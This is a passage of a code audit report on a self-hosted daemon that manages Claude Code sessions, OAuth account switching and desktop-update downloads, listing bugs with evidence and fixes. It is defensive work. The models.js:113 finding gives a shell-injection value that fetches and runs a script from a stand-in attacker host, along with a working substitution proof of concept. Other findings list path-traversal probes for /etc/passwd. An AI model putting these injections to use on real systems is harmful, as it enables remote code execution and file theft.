**Suggested fix:** After sending the digits, re-capture the pane and assert the intended option carries the selection caret before pressing Enter (the route already has captureScreen + detectPrompt in hand); alternatively navigate with Down x (n-1) + Enter, which is unambiguous for any n. At minimum, do not report ok:true for option >= 10 without confirming.

### `server/appd/huginn-appd.js:2831`

The artifact routes ignore the Range header and never advertise Accept-Ranges, so a ~90MB installer download can never be resumed and a client that assumes 206 semantics would mis-assemble the file.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The Compose desktop client updater fetches a ~90MB installer over the Yggdrasil mesh from off-LAN. The transfer drops at 80MB. Because the server neither advertises nor honours ranges, the retry must re-fetch all 90MB from zero; on a link that drops every few minutes the update can never complete. Separately, electron-updater's differential downloader issues Range requests during its blockmap path - it gets a 200 with the whole file and has to detect and fall back, wasting a full extra transfer each poll.

<details><summary>Evidence</summary>

```
Code (2831-2836) writes an unconditional 200 with the full Content-Length and pipes the whole file; there is no read of `req.headers['range']` anywhere in the file (grep 'req.headers' returns only authorization, x-huginn-client, x-huginn-notify, user-agent, content-type).

RAN:
  curl -D - -H 'Range: bytes=0-99' .../v1/desktop/Huginn-Setup-9.9.9.exe
    HTTP/1.1 200 OK
    Content-Type: application/octet-stream
    Content-Length: 60000000
(the full 60MB body, not a 206 with 100 bytes; no Accept-Ranges header in the response)
```

</details>

**Suggested fix:** Honour single-range requests in serveDesktopArtifact: parse `bytes=start-end`, and when present respond 206 with Content-Range and `fs.createReadStream(found.file, { start, end })`. Always send `Accept-Ranges: bytes` on the 200 path.

### `server/appd/huginn-appd.js:2836`

An aborted desktop-installer download leaves the fs.createReadStream open forever (pipe has no dest-close cleanup), leaking one fd per aborted fetch of a ~90MB artifact.

**lane** appd async ordering, state persistence, and concurrency · **verdict** CONFIRMED by lead (L12) · **demonstrated by running it**

**What goes wrong:** A laptop on flaky wifi retries the ~90MB updater download repeatedly, aborting each time -> the daemon accumulates open fds and pinned stream buffers; enough of them reach EMFILE, at which point every spawn (claude runs, tmux calls) starts failing daemon-wide until restart.

<details><summary>Evidence</summary>

```
serveDesktopArtifact 2835-2837: `const stream = fs.createReadStream(found.file); stream.pipe(res); stream.on('error', () => { try { res.destroy(); } catch { } });` — cleanup only for SOURCE errors; nothing handles the response closing. Demonstrated (t3-abort-body.js, Node 22.23.1): client aborted mid-download of a 64MB file; 2.2s later the source stream reported `destroyed=false closed=false fd-open=true`. pipe() only reacts to dest 'error'/'unpipe', not 'close', and the paused source holds its fd indefinitely.
```

</details>

**Suggested fix:** Add `res.on('close', () => stream.destroy());` (or use stream.pipeline(stream, res, cb) which tears down both sides).

### `server/appd/huginn-appd.js:2845`

decodeURIComponent on the artifact name segment throws on a malformed percent-escape, producing a 500 'URI malformed' instead of a 400 for what is purely a bad client request.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A release script or an updater builds an artifact URL by string-concatenating a version that contains a stray '%' (e.g. a build label like '0.4.0%rc1'). The client gets 500, which its error handling classifies as 'the update server is broken' and retries on a backoff, when the correct and immediately actionable answer is 400 'bad name'. It also puts a spurious ERROR line in the daemon journal for a client-side typo.

<details><summary>Evidence</summary>

```
Code (2845, and identically 2858 for the -kt channel):
  return serveDesktopArtifact(DESKTOP_DIR, decodeURIComponent(m[1]));
The throw lands in the generic catch at 3127.

RAN:
  GET /v1/desktop/%zz  -> 500  {"error":"URI malformed"}
Compare the correctly-rejected forms, which all fail closed at lib/desktop validName:
  GET /v1/desktop/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd -> 400 {"error":"bad name"}
  GET /v1/desktop/..%2f..%2fetc%2fpasswd                  -> 400 {"error":"bad name"}
  GET /v1/desktop/%00                                     -> 400 {"error":"bad name"}
```

</details>

**Suggested fix:** Decode defensively: `let name; try { name = decodeURIComponent(m[1]); } catch { return sendErr(res, 400, 'bad name'); }` in both channel routes (or fold the decode into a shared helper alongside serveDesktopArtifact).

### `server/appd/huginn-appd.js:2845`

A malformed percent-escape in an artifact name makes decodeURIComponent throw, so the route answers 500 "URI malformed" and logs an ERROR instead of the 400 "bad name" that resolveArtifact exists to produce.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Any client (or a probe, or a mistyped URL) requesting /v1/desktop/50%-off.exe gets a 500 whose body is the raw JS error text `URI malformed`, and the daemon writes an `ERROR GET /v1/desktop/...` line to its journal. A 5xx on an update feed is the signal a client uses to decide the server is broken rather than the request; DesktopUpdater's failure path and any future monitoring on appd 5xx rates will both misattribute a bad request as a daemon fault.

<details><summary>Evidence</summary>

```
Code (huginn-appd.js:2845 and 2858):
      return serveDesktopArtifact(DESKTOP_DIR, decodeURIComponent(m[1]));
decodeURIComponent is called outside any try, so the URIError escapes to the outer handler (huginn-appd.js:3127) which does `log('ERROR', ...)` and `sendErr(res, 500, e.message)`.

RAN against the live daemon:
  $ curl -i .../v1/desktop/%zz   -> HTTP/1.1 500 Internal Server Error
  $ curl -i .../v1/desktop/%     -> HTTP/1.1 500 Internal Server Error
Compare the well-formed hostile inputs, which correctly 400:
  /v1/desktop/%2e%2e%2f%2e%2e%2fetc%2fpasswd -> 400
  /v1/desktop/%2fetc%2fpasswd                -> 400
```

</details>

**Suggested fix:** Decode inside a guard: `let name; try { name = decodeURIComponent(m[1]); } catch { return sendErr(res, 400, 'bad name'); }` — or drop the decode entirely, since NAME_RE admits no character that needs escaping.

### `server/appd/huginn-appd.js:2875`

The advertised 7-day upload retention is not a retention policy: pruneUploads only ever runs inside POST /v1/uploads, so when nobody uploads, nothing is ever deleted.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The owner photographs something sensitive (a screen with credentials, a document, a whiteboard) and sends it to an ask chat. The feature is then not used again for a month. The stated 7-day expiry never fires, and the JPEG sits in /var/lib/huginn-appd/uploads indefinitely, readable by every subsequent ask-mode chat — which, per the TOOLS comment at huginn-appd.js:99-106, has Read granted by default and no scoping. Honest scoping: ask chats can already read any file on huginn, so this is not a new exposure surface, only a broken promise about how long the photo lives; the concrete cost is that a deletion the owner believes happened did not.

<details><summary>Evidence</summary>

```
The only call site is huginn-appd.js:2875, inside the upload route:
      fs.mkdirSync(UPLOADS_DIR, { recursive: true });
      pruneUploads();
and the function's own docstring (huginn-appd.js:76-79) states the intent: "Drops uploads old enough that no conversation is coming back for them. Run on each upload rather than a timer". There is no timer, no startup sweep, and no other reference to pruneUploads in the file.

Observed state today (2026-08-04 13:53), /var/lib/huginn-appd/uploads: 26 files, oldest `img-1785279197583-fa8d3c.png` dated Jul 28 15:53, newest `up-1785478131076-54a24d.jpg` dated Jul 30 23:08 — i.e. the prune has not run in five days and the Jul 28 photos cross the 7-day line this afternoon with nothing scheduled to notice.
```

</details>

**Suggested fix:** Also sweep on startup and on an unref'd daily timer, e.g. `pruneUploads(); const t = setInterval(pruneUploads, 24*60*60*1000); t.unref();` next to the other startup timers around huginn-appd.js:2020.

### `server/appd/huginn-appd.js:3129`

A malformed JSON request body is reported as HTTP 500 with the parser's message (which echoes a fragment of the body) rather than 400, so clients treat a permanently-bad request as a retryable server fault.

**lane** appd route authorization and HTTP surface · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A client (or a future third-party integration) serialises a chat PATCH body incorrectly - e.g. sends form-encoded data because a Content-Type default changed. It receives 500, which every HTTP client library and the app's own retry policy classify as a transient server error, so it retries the identical malformed body indefinitely instead of surfacing 'bad request' once. The daemon logs an ERROR line per attempt, which also pollutes the journal that real failures have to be found in.

<details><summary>Evidence</summary>

```
Every JSON POST/PATCH route does `JSON.parse(await readBody(req) || '{}')` with no try/catch of its own (lines 2059, 2125, 2162, 2378, 2433, 2493, 2541, 2681, 2696, 2734, 2921, 2969, 3102), and the only handler is the generic catch:
  } catch (e) {
    log('ERROR', req.method, p, e.message);
    if (!res.headersSent) return sendErr(res, 500, e.message);

RAN against the scratch daemon:
  POST /v1/chats  --data 'SECRETLOOKINGGARBAGE{'
    -> {"error":"Unexpected token 'S', \"SECRETLOOK\"... is not valid JSON"}  code=500
  PATCH /v1/chats/<id>  --data 'nope'
    -> {"error":"Unexpected token 'o', \"nope\"... is not valid JSON"}  code=500
```

</details>

**Suggested fix:** Wrap the parse in a helper: `function parseJson(s){ try { return JSON.parse(s || '{}'); } catch { const e = new Error('invalid JSON body'); e.status = 400; throw e; } }`, and have the generic catch honour `e.status` (`sendErr(res, e.status || 500, e.status ? e.message : 'internal error')`).

### `server/appd/lib/accounts.js:152`

writeOauthAccount does an unlocked read-modify-write of the whole 71 KB ~/.claude.json, so a concurrent write by any of the several Claude Code sessions that share this host is silently discarded — the exact stale-whole-object-snapshot mistake the codebase has already been burned by twice.

**lane** appd secrets hygiene, credential handling, and host hardening · **contract** C10 · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Autoswitch fires at 95% (or the owner taps Switch in Settings). performSwitch -> accounts.activate -> writeOauthAccount reads the 71 KB ~/.claude.json, and in the milliseconds it spends parsing, mutating and re-serialising, a live `claude` session writes that same file (it does so on session start/stop, tips, MCP state, project history). The rename lands appd's pre-mutation snapshot on top, and the session's write is gone with no error on either side — the CLI's project history, queued tips or MCP server state silently rolls back to whatever it was when appd started the switch. The blast radius is the whole file because the read-modify-write covers the whole file, not just the `oauthAccount` key it wants to change.

<details><summary>Evidence</summary>

```
lib/accounts.js:152-167 `writeOauthAccount(account) { ... try { cfg = JSON.parse(fs.readFileSync(this.configPath, 'utf8')); } catch { return false; } if (account) cfg.oauthAccount = account; else delete cfg.oauthAccount; const tmp = ...; fs.writeFileSync(tmp, JSON.stringify(cfg), { mode }); fs.renameSync(tmp, this.configPath); ... }` — read at :155, rename at :161, nothing in between claims a lock, and the rename atomically replaces whatever landed in the window. RAN: `/root/.claude.json` is 71382 bytes, -rw------- root:root, mtime 2026-08-04 13:47 (minutes before this audit ran); `tmux list-sessions` counts 2 live Claude sessions sharing it, and the repo's own CLAUDE.md states 3-4 interactive sessions plus headless one-shots routinely share this tree. The daemon's own header at accounts.js:124-128 documents that this file is the CLI's live identity store. `/v1/autoswitch` on the live daemon returns `{"enabled":true,"switches":0,"accounts":3,"threshold":95}` — the caller is armed and has simply not fired yet.
```

</details>

**Verifier's correction:** The unlocked read-modify-write is real, but it is a ~2 ms window on a path that fires about once a week, giving ~7e-4 per switch — and it lands in a file the CLI is already rewriting non-atomically 13 times a minute from multiple sessions, so appd's single weekly write does not measurably change the host's existing lost-update rate. Nothing credential-bearing is at risk (credentials live in a different file). Real but LOW; the cheap re-stat-before-rename guard in the fix is still worth taking, the lockfile is not warranted.

**Suggested fix:** Take an exclusive lock around the read-modify-write — an O_CREAT|O_EXCL lockfile beside ~/.claude.json (retry a few times, bail out and return false rather than write blind) or flock on the file itself. At minimum re-stat between read and rename and abort the write if mtime/size moved, which turns a silent clobber into a retry. The rest of the module already got this lesson (huginn-appd.js:658-672 `updateMeta` exists purely to stop writing back stale meta snapshots); this path never got it.

### `server/appd/lib/accounts.js:204`

Superseded account profiles are archived forever and never pruned, so the host accumulates an unbounded, permanently growing pile of full OAuth credential blobs — 12 today, every one carrying a refresh token whose own declared expiry is still three weeks in the future.

**lane** appd secrets hygiene, credential handling, and host hardening · **contract** C8 · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** The daemon has run 7 days and holds 3 live + 12 archived credential blobs for the owner's 3 Claude Max accounts. At the observed 1.7/day it reaches ~600 archived credential files within a year, none of which any code path ever reads back (`_records()` only scans top-level `*.json`, so `superseded/` is invisible to list/consolidate/activate). Every one of them is included wholesale in the LXC 117 container backup, which per the repo's own open-items list goes to PBS without at-rest encryption and then offsite to B2 — so a single restored or exfiltrated backup image yields hundreds of nominally-live refresh tokens for the owner's paid accounts instead of the three that are actually in use. Nothing in the system ever reduces that number.

<details><summary>Evidence</summary>

```
lib/accounts.js:54 `/** Where consolidate() puts records it folded into another. Never deleted. */` and :204-210 `_archive(slug, rec) { ... fs.renameSync(this._path(slug), dest); }` — the only writer to `superseded/`, with no matching prune/expiry anywhere (grep for ARCHIVE_DIR finds exactly one use). RAN, metadata only, no values printed: `SUPERSEDED: live-refresh=12  expired-refresh=0  unknown=0` — every one of the 12 files reports `refreshTokenExpiresAt` of 2026-08-24/25 against today's 2026-08-04, and each holds keys `[accessToken,refreshToken,expiresAt,refreshTokenExpiresAt,scopes,subscriptionType,rateLimitTier]` with a 108-char refreshToken. File dates show the growth rate: 6 files on 07-28, then 2, 1, 1, 1, 1 through 08-03 — ~1.7 new credential copies per day, driven by `autoswitchTick` calling `saveIdentified(null, accounts.readActive())` every 5 minutes (huginn-appd.js:1688) against a refresh token the CLI rotates every few hours. Modes are correct (superseded dir drwx------ root:root, files -rw------- root:root); the defect is lifetime and count, not permissions.
```

</details>

**Verifier's correction:** The archive is not growing. It is a one-time 12-file backlog produced by the 2026-08-03 consolidate() that FIXED the rotation-duplication bug; the steady state (uuid resolved) archives nothing at all, as both the live 40 h of operation and 200 simulated rotations show. The archived refresh tokens are the superseded halves of completed rotations, which accounts.js:27-28 records as no longer authenticating — a future `refreshTokenExpiresAt` is not evidence of validity. Real residual issue, at LOW: 12 dead credential blobs with no expiry policy that get backed up. Correct fix is the prune half only; the 'stop manufacturing archives on a timer' half is a no-op because the timer does not manufacture them.

**Suggested fix:** Give the archive a lifetime. In `_archive`, after the rename, sweep `superseded/` and delete entries whose `credentials.claudeAiOauth.refreshTokenExpiresAt` is in the past, and additionally cap the directory to the N most recent per slug (N=2 is enough to hand a login back). Both are cheap and preserve the file's stated 'a surplus profile is a nuisance, a missing one is a lost login' bias, because an expired refresh token cannot restore anything anyway. Separately, stop manufacturing archives on a timer: `autoswitchTick` only needs the active profile's identity, so gate its `saveIdentified` on the fingerprint having actually changed since the last tick rather than re-saving every 5 minutes.

### `server/appd/lib/accounts.js:478`

remove() (DELETE /v1/accounts/:slug) permanently unlinks a login's only stored credentials, bypassing the superseded/ archive discipline every other destructive path in the store follows.

**lane** lib/accounts.js + lib/autoswitch.js + lib/usage.js + lib/plan.js — account identity and switching · **verdict** not separately verified

**What goes wrong:** A stray tap on delete for the idle e12d3fa9 account (or a client retrying a DELETE) unlinks the only copy of that login; unlike every rotation/consolidation mishap, there is nothing in superseded/ to hand back — the owner must re-run the whole browser sign-in flow.

<details><summary>Evidence</summary>

```
`remove(slug) { try { fs.unlinkSync(this._path(slug)); return true; } ... }` versus _archive() used by save() and consolidate(), whose comment states the store's own rule: 'an archived login can be put back, a deleted one cannot.' Route regex `[a-z0-9-]{1,60}` (huginn-appd.js:2366) matches uuid slugs, 16-hex fingerprint slugs, AND the active account's slug — verified against the live slugs. Deleting the ACTIVE row is self-healing (credentials file untouched; the next /v1/accounts poll re-saves it, losing only firstSeen/lastPlan/taggedId), but deleting a NON-active row destroys that login's only credential copy with no server-side confirmation.
```

</details>

**Suggested fix:** Make remove() archive to superseded/ (same `${slug}-${savedAt}.json` convention) instead of unlinking; optionally require a confirm body like /v1/account/logout does.

### `server/appd/lib/desktop.js:80`

resolveArtifact stats the path and the route then opens it separately, so a release replacing manifest.json / latest.yml / CHANGELOG.md between the two sends a Content-Length that does not match the bytes streamed.

**lane** lib/uploads.js + lib/desktop.js — upload spool and release-artifact serving · **verdict** not separately verified

**What goes wrong:** The owner runs desktop/scripts/release.sh while a desktop client's 4-hourly update poll is in flight. The client GETs /v1/desktop/latest.yml; resolveArtifact stats the 0.4.0 file at 340 bytes; the `mv` lands the 0.5.0 file at 352 bytes in the microseconds before createReadStream opens the name; the response advertises Content-Length 340 and delivers 352, so the client parses a truncated YAML (`sha512:` cut mid-base64) and either errors or, worse, accepts a feed whose checksum line was clipped. Same race applies to the release script's own step-7 verification, which would report a byte-count mismatch and abort a good release.

<details><summary>Evidence</summary>

```
lib/desktop.js:78-84:
  const file = path.join(dir, name);
  let st;
  try { st = fs.statSync(file); } catch { ... }
  ...
  return { ok: true, file, contentType: contentTypeFor(name), size: st.size };
huginn-appd.js:2831-2836 then does `res.writeHead(200, { 'Content-Length': found.size })` followed by a fresh `fs.createReadStream(found.file)` — a second path resolution, not an fstat of the stat'd inode.

The replacement is real and in-place for exactly these three names: desktop/scripts/release.sh:104-112 does `install -m 644 dist/manifest.json "$DESKTOP_DIR/manifest.json.tmp"; mv ...tmp .../manifest.json` (same for latest.yml, latest-linux.yml, CHANGELOG.md), and mobile/scripts/release-desktop.sh:338-341 does the same. Versioned installers are immune because their names change; these four are not.
```

</details>

**Suggested fix:** Resolve once against a file handle: `const fh = fs.openSync(file, 'r'); const st = fs.fstatSync(fh);` and hand the route `fs.createReadStream(null, { fd: fh })`, so the size and the bytes come from the same inode.

### `server/appd/lib/models.js:113`

The only place in the daemon that builds a shell string uses JSON.stringify as its quoting function, which is not shell-safe — double quotes still expand $(), backticks and $VAR inside sh -c.

**lane** command and tmux injection in appd · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Anyone who later points HUGINN_CLAUDE_BIN at a path from a config file, a drop-in, or an operator-supplied value gets arbitrary command execution as root the first time /v1/models is requested — a route reachable by any token holder. Setting HUGINN_CLAUDE_BIN='/x/$(curl attacker/s|sh)' in the unit is enough.

<details><summary>Evidence</summary>

```
```js
112: execFile('sh', ['-c',
113:   `strings -n 6 ${JSON.stringify(binPath)} | grep -oE 'claude-(fable|opus|sonnet|haiku)-[0-9][0-9a-z-]*' | sort -u`],
```
RAN IT — proved JSON.stringify does not neutralize command substitution in this exact construct:
```
$ node -e '...execFile("sh",["-c",`strings -n 6 ${JSON.stringify(binPath)} | ...`])...'
quoted as: "/tmp/$(id -u > .../PWNED)x"
side effect file exists: true
contents: 0
```
Currently NOT remotely reachable: binPath is `process.env.HUGINN_CLAUDE_BIN || '/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe'` (:2275-2276) and the deployed unit sets no such variable (`systemctl show huginn-appd -p Environment` -> `NODE_ENV=production HOME=/root HUGINN_APPD_BIND=0.0.0.0`). Every other command in the daemon is a proper argv array; this is the lone exception. Secondary: execFile's 60s timeout SIGTERMs only `sh`, leaving the `strings`/`grep`/`sort` pipeline running against a ~100MB binary.
```

</details>

**Suggested fix:** Drop the shell entirely: `execFile('strings', ['-n','6',binPath], {maxBuffer})` and do the grep/sort/uniq in JS with the same regex — the pipeline is three lines of JavaScript and removes the only shell-string in the daemon.

### `server/appd/lib/models.js:118`

discoverModels caches the fallback alias list under the binary's identity even when discovery FAILED, so one transient timeout pins the model menu to four family aliases until the claude binary is reinstalled.

**lane** command and tmux injection in appd · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** The host is under load (the daemon spawns `strings` over a ~100MB binary with a 60s timeout while a fan-out is running) and discovery times out once. From then on the app's model picker shows only "Fable / Opus / Sonnet / Haiku" with no versions — defeating the module's stated purpose ("Everything here exists to keep the VERSION visible") — and no restart fixes it because the cache is rebuilt to the same fallback on the same key.

<details><summary>Evidence</summary>

```
```js
114: { timeout: timeoutMs, maxBuffer: 8 * 1024 * 1024 }, (err, stdout) => {
115:   const ids = err ? [] : stdout.split('\n')...;
116:   const picked = selectModels(ids);
117:   const models = picked.length ? picked : aliasModels();
118:   cache = { key, models };          // cached even though err was set
```
The cache key is `${binPath}:${size}:${mtimeMs}` (:100-105), so nothing but a reinstall invalidates it, and /v1/models (:2274-2277) offers no bust.

RAN IT — second call returns the identical cached fallback object:
```
call1 (no ids found) -> fable,opus,sonnet,haiku
call2 (same key)     -> fable,opus,sonnet,haiku | same object: true
```
Today's live output is healthy (7 versioned ids incl. claude-fable-5/claude-opus-5), so this is latent, not active.
```

</details>

**Suggested fix:** Only cache a SUCCESSFUL discovery: `if (!err && picked.length) cache = { key, models };`. Leave failures uncached so the next request retries.

### `server/appd/lib/pane.js:50`

MODE_HINT_RE lacks U+23F8 ⏸ (which parseStatusLine's own glyph class includes), so the manual- and plan-mode hint lines leak into previewLines output as session 'content'.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Every idle session sitting in manual or plan mode shows '⏸ plan mode on (shift+tab to cycle) · ← for agents' as its preview line in the phone/desktop session list instead of real last content. (Also consumes one unit of detectPrompt's 4-line footer budget in those modes, since isChrome uses MODE_HINT_RE.)

<details><summary>Evidence</summary>

```
MODE_HINT_RE = /^\s*[⏵⏴]{1,2}\s/ vs parseStatusLine's /^[⏵⏴⏸⏹▶]{1,2}.../. LIVE-PROVEN: with the scratch session in manual and plan modes, previewLines returned '⏸ manual mode on · ← for agents' and '⏸ plan mode on (shift+tab to cycle) · ← for agents' as the newest preview line (parsed via pane-run.js against live captures); in auto mode ('⏵⏵') the hint is correctly skipped.
```

</details>

**Suggested fix:** Use one shared glyph class [⏵⏴⏸⏹▶] for both MODE_HINT_RE and parseStatusLine.

### `server/appd/lib/pane.js:52`

SPINNER_RE — the spinner class detectPrompt's isChrome relies on — disagrees with the live spinner rotation in both directions, making prompt detection depend on which animation frame tmux captured.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **contract** C2 · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Any pane state where the spinner is the only chrome below a caret-marked numbered run flips PROMPT/null at spinner-tick cadence — fingerprint churn feeding the prompt watcher. Mitigating fact (live-verified, frame f2): current Claude Code keeps composer+status+mode drawn below the spinner mid-turn, so ordinary mid-turn frames are shielded; exposure is torn capture frames (one fully-blank tear was captured this session) and any future TUI state that hides the composer while working.

<details><summary>Evidence</summary>

```
SPINNER_RE = /^\s*[◀-◿✹✳✴✻-✽✶]\s/. Live glyph inventory from 145 captured mid-turn frames TODAY: ✢ U+2722, ✻ U+273B, ✽ U+273D, ✶ U+2736, · U+B7, * U+2A — SPINNER_RE misses ✢, ·, and * (and ✦✧✸✺ from the 10-glyph set pane.test.js:381 documents as captured live), while LIVE_STATUS_RE/GLYPH_STATUS_RE accept all of them. Node-proven flip: detectPrompt(['Pick:','❯ 1. a','  2. b','✻ Working…'])=null but the identical screen with ✢/✦/✧/✸/✺ returns a 2-option PROMPT (demo A). Also assembled entirely from live-captured fragments: '❯ 1. name one fruit'/'  2. name one vegetable' (verbatim sent-message render) + '· Envisioning…' => fake PROMPT; same with '✻' => null. Conversely SPINNER_RE accepts ✴ (which LIVE_STATUS_RE rejects) and the whole U+25C0-U+25FF block (●, ◯ — glyphs pane.js:300-302's own comment says are NOT spinners). This is the third recurrence of the 'proving itself on a different glyph' bug the file's own comment at lines 288-292 documents; pane.test.js:705 asserts the spinner-below-run invariant for ✻ only.
```

</details>

**Verifier's correction:** The glyph-class inconsistency is real and live-observable (✢ U+2722 appeared in today's rotation and SPINNER_RE misses it), but the claimed failure — PROMPT/null flipping at spinner-tick cadence — is unreachable in ordinary panes because the mode hint sits below the spinner and short-circuits isChrome first; 160 live frames produced zero prompts and zero torn frames. Downgrade to LOW as a latent-consistency defect. The stronger residual risk is the reverse direction the finding under-weights: ◯ U+25EF (workflow row) being read as spinner-chrome turns a real plan-approval dialog into null — demonstrated mechanically on captured fragments, reachability not proven. The proposed fix (one shared glyph class, drop/scope the ◀-◿ block) is still the right change and would close both directions.

**Suggested fix:** One shared spinner-glyph class for SPINNER_RE, LIVE_STATUS_RE and GLYPH_STATUS_RE (the 10 documented glyphs + ·∙∗*+), drop or scope the ◀-◿ block, and extend the pane.test.js:705 invariant across the whole class the way test 381 already does for parseSpinner.

### `server/appd/lib/pane.js:213`

The question heuristic (nearest non-furniture line above the options) picks the 'Security guide' hyperlink label as the question on the folder-trust dialog, so the card for a freshly adopted session asks 'Security guide' instead of the actual trust question.

**lane** lib/pane.js — prompt detector and all pane-reading regexes (C2) · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner spawns/adopts a session in a new directory from the phone; the first prompt card reads 'Security guide' with Yes/No options — answerable but misleading, and the notification headline is wrong.

<details><summary>Evidence</summary>

```
LIVE-PROVEN on the real trust dialog (cap-boot.txt): detectPrompt returned question:'Security guide', options ['Yes, I trust this folder','No, exit']; the real question ('Quick safety check: Is this a project you created or one you trust?...') sits 4 lines up beyond the OSC8 link-label line the heuristic grabbed.
```

</details>

**Suggested fix:** Skip short standalone link-label lines (line that was wholly an OSC8 label, or <3 words with no terminal punctuation/question mark) when hunting the question, preferring the nearest line containing '?' within the window.

### `server/appd/lib/transcript.js:81`

`[Request interrupted by user]` and `[Request interrupted by user for tool use]` are real machine-written user records missing from the known-openings list, so every Esc interrupt renders as a message the owner typed.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **verdict** CONFIRMED (CONFIRMED:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Owner presses Esc to interrupt a turn in a tmux session; the phone/desktop conversation shows a user bubble '[Request interrupted by user for tool use]' as if the owner typed bracketed machine text — recurring in 59 real transcripts on this box.

<details><summary>Evidence</summary>

```
machineText regex lists only `\[SYSTEM NOTIFICATION|\[Image: original \d+x\d+|\[Your previous response`. Ran corpus scan: 59 transcript files under ~/.claude/projects contain `[Request interrupted`; inspected shapes: type=user, content array, whole message is the marker. Ran the module: `machineText("[Request interrupted by user]") = false` and readTranscript renders `{"kind":"user","text":"[Request interrupted by user]"}`. The CLI renders these as an interrupt marker, not user prose.
```

</details>

**Verifier's correction:** Severity MED -> LOW. The claim is factually correct, but the consequence is bubble styling only: the text shown is accurate and self-explanatory ('[Request interrupted by user]'), so no information is lost or misrepresented, unlike the image-caption case at line 397. The finding's own fix (add to machineText + map in describeMachineText) is also incomplete on its own — with the line-397 humanRemainder gap still present, adding the opening to machineText would push the marker back out as a user bubble anyway (29 chars clears humanRemainder's >=12 floor).

**Suggested fix:** Add `\[Request interrupted` to the machineText known-openings, and in describeMachineText map it to e.g. {kind:'system', text:'interrupted'} (a note, matching the CLI's own rendering).

### `server/appd/lib/transcript.js:242`

A cold open (offset == null) of a file containing no newline yet — a brand-new transcript mid-first-record — consumes the partial line's bytes (consumed = buf.length), so the tailing client's offset permanently skips the first record once the writer completes it.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **contract** C9 · **verdict** CONFIRMED (CONFIRMED:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Owner creates a chat from the phone; the phone starts polling the transcript the instant findTranscriptFile resolves — i.e. within the file's first milliseconds, while the first record (a multi-KB file-history-snapshot or the prompt itself) is mid-flush. That record is skipped in the live view for as long as the screen stays open; if it was the user record, the owner's own first message is missing from the conversation.

<details><summary>Evidence</summary>

```
`if (lastNl === -1) { if (offset != null) return emptyResult(start, truncated); }` — the cold-open case falls through with consumed still buf.length, violating the module's own rule ('A concurrent writer can leave a partial final line; leave it for next time'). Ran it: file = first 40 bytes of a record; cold open returns events 0, nextOffset 40; after appending the rest + '\n', readTranscript(p,{offset:40}) returns 0 events — the first message never reaches the follower (a fresh cold open does see it).
```

</details>

**Verifier's correction:** Severity MED -> LOW. The code path and the offset-skip are exactly as claimed, but the failure_scenario's 'the phone starts polling within the file's first milliseconds' needs the first successful poll (2500ms cadence, gated behind fs.existsSync) to interleave with a single sub-page write: median first record is 3317 bytes and only 9 of 1316 transcripts have a first record large enough (>=64KB) to be partially observable at all. 'Permanently skips' is also scoped — it is permanent only for that open view; reopening the session cold-opens and recovers the record.

**Suggested fix:** In the lastNl === -1 cold-open case, set consumed = 0 (return the empty result with nextOffset = start) so the partial first line is left for the next read, same as the tail-follow path.

### `server/appd/lib/transcript.js:244`

consumed is measured on the UTF-8-decoded string, so a cold-open window starting mid-multibyte-character inflates it (each orphan continuation byte becomes a 3-byte U+FFFD), overshooting nextOffset into the pending partial line and silently dropping that record from the follow stream.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **contract** C9 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Cold open of a busy session whose tail window happens to start inside an emoji/box-drawing char in earlier content while the CLI is mid-line (both common during streaming output): the record being written at that moment never appears in that client's view. Rare conjunction, one record lost per hit.

<details><summary>Evidence</summary>

```
`const keep = Buffer.byteLength(text.slice(0, lastNl + 1), 'utf8')` where text = buf.toString('utf8') replaced 3 leading emoji-continuation bytes with 3 U+FFFD (9 bytes). Ran it with the window start aligned 1 byte into a 4-byte emoji plus a concurrent partial final line: OVERSHOOT: 6 bytes (nextOffset 262136 vs correct 262130); after the writer completed the line, the follower read 0 events instead of 1 — the in-flight record lost.
```

</details>

**Suggested fix:** Compute consumption in the byte domain: `const lastNlByte = buf.lastIndexOf(0x0a); consumed = lastNlByte + 1; text = buf.toString('utf8', 0, consumed)` — immune to replacement-character inflation and also cheaper than the string round-trip.

### `server/appd/lib/transcript.js:254`

When the cold-open tail window lands exactly ON a record-terminating newline byte, the first whole record inside the window is wrongly sliced off — the residual off-by-one of the audit-round-6 boundary fix.

**lane** lib/transcript.js — transcript reading, paging, and rendering data · **contract** C9 · **verdict** CONFIRMED (CONFIRMED:1) · **severity** MED → LOW · **demonstrated by running it**

**What goes wrong:** Cold open of any truncated transcript where size - window lands on a newline (~1 in avg-record-length per cold open, window start is effectively arbitrary): the topmost visible record — possibly a user message — is silently missing from the view, the same user-visible loss the round-6 fix was bought to prevent.

<details><summary>Evidence</summary>

```
